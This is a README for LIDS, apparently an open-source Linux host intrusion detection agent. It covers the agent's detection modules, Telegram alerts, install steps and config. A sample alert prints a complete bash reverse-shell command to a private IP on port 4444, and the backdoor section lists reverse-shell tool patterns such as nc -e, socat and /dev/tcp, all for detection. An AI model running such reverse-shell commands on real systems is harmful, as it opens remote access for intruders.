<div align="center">

# 🛡️ LIDS

### Linux Intrusion Detection System

**Real-time attack detection · Telegram alerts**

Lightweight host-based security agent for Kali Linux, Parrot OS, and Arch Linux.
Real-time alerts via Telegram. One-line install.

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square)](https://python.org)
[![License: MIT](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
[![Platform: Linux](https://img.shields.io/badge/platform-Linux-orange?style=flat-square)](#)

</div>

---

## Features

| Module | What it detects |
|--------|----------------|
| **Port Monitor** | New ports opened, suspicious port numbers (4444, 1337, etc.) |
| **SSH Monitor** | Weak SSH config, PermitRootLogin, PasswordAuth |
| **Log Monitor** | Brute force attacks, root logins, sudo abuse |
| **Backdoor Scanner** | Reverse shells, cron backdoors, SUID abuse, SSH key injection, LD_PRELOAD, hidden root users, webshells, rootkit indicators |
| **Process Monitor** | Miners, C2 tools, processes from /tmp |
| **Malware Scan** | rkhunter, chkrootkit integration |
| **Firewall** | Block IP/port via iptables or ufw with duration timer |

---

## Install

```bash
git clone https://github.com/Yescrypt/lids
cd lids
sudo bash ./install.sh
```

Installer asks:
- Hostname label
- OS name
- Telegram User ID

Then LIDS registers with the server and starts monitoring.


## Backdoor Detection

LIDS detects post-exploitation artifacts:

- **Reverse shells** — bash -i, /dev/tcp, nc -e, socat, python sockets
- **Cron backdoors** — suspicious entries in /etc/cron.d, /var/spool/cron
- **Startup persistence** — rc.local, .bashrc, .profile, systemd units
- **SUID abuse** — unexpected SUID/SGID binaries
- **SSH key injection** — new keys added to authorized_keys
- **LD_PRELOAD hijacking** — /etc/ld.so.preload or env injection
- **Hidden root users** — UID 0 accounts besides root
- **/tmp executables** — binaries running from /tmp, /dev/shm
- **Webshells** — PHP/ASP shells in web roots
- **Rootkit indicators** — hidden PIDs, suspicious system files

---

## Telegram Alerts

```
🚨 SSH Brute Force Attack

Host: kali-lab
IP: 185.x.x.x
Attempts: 32
Window: 120s

[🚫 BLOCK IP] [🔍 WHOIS] [✅ IGNORE]
```

```
🚨 REVERSE SHELL DETECTED

PID: 2211
CMD: bash -i >& /dev/tcp/192.168.1.5/4444

[☠️ KILL NOW] [🔍 TRACE] [✅ IGNORE]
```

---

## Config

`/etc/lids/lids.conf`

```json
{
    "agent_id": "...",
    "auth_key": "...",
    "scan_interval": 30,
    "whitelist_ports": [80, 443, 22, 53],
    "whitelist_processes": ["nmap", "netcat", "nc"],
    "whitelist_ips": []
}
```

---

## Commands

```bash
systemctl status lids    # Check status
systemctl restart lids   # Restart
tail -f /var/log/lids/lids.log  # Logs
```
---

## License

MIT License © 2026 LIDS Contributors

This project is licensed under the MIT License.  
See the <img src="https://cdn-icons-png.flaticon.com/512/1208/1208147.png" width="20"> [MIT](LICENSE) file for details.